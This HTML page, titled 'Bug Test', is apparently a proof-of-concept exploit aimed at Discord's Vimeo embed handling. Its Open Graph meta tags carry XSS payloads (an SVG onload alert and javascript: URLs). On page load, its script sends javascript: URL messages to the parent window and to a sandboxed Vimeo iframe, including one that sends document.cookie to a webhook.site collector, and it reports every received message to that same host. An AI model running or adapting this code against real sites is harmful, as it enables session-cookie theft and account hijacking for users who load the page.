<!DOCTYPE html>
<html>
<head>
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="data:image/svg+xml,<svg onload=alert(document.domain)>">
    <meta property="og:video:url" content="vimeo-player://player.vimeo.com/video/403530213?success=javascript:alert(1)">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="99999999999999999">
    <meta property="og:video:height" content="-1">
    <title>Bug Test</title>
    <script>
    async function attemptExploit() {
        try {
            // Test postMessage with different origins
            ['https://discord.com', 'https://vimeo.com', '*'].forEach(origin => {
                window.parent.postMessage({
                    type: 'DISPATCH',
                    payload: {
                        url: 'javascript:alert(1)'
                    }
                }, origin);
            });

            // Test iframe sandbox escape
            const frame = document.createElement('iframe');
            frame.src = 'https://player.vimeo.com/video/403530213';
            frame.sandbox = 'allow-scripts';
            frame.onload = () => {
                frame.contentWindow.postMessage({
                    type: 'playerConfig',
                    data: {
                        url: 'javascript:fetch("https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?"+document.cookie)'
                    }
                }, '*');
            };
            document.body.appendChild(frame);

            // Log attempt
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'exploit_attempted',
                    url: location.href,
                    timestamp: new Date().toISOString()
                })
            });

        } catch(e) {
            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
                method: 'POST',
                body: JSON.stringify({
                    type: 'error',
                    error: e.toString(),
                    stack: e.stack
                })
            });
        }
    }

    window.onmessage = (e) => {
        fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
            method: 'POST',
            body: JSON.stringify({
                type: 'message_received',
                origin: e.origin,
                data: e.data
            })
        });
    };

    window.onload = attemptExploit;
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
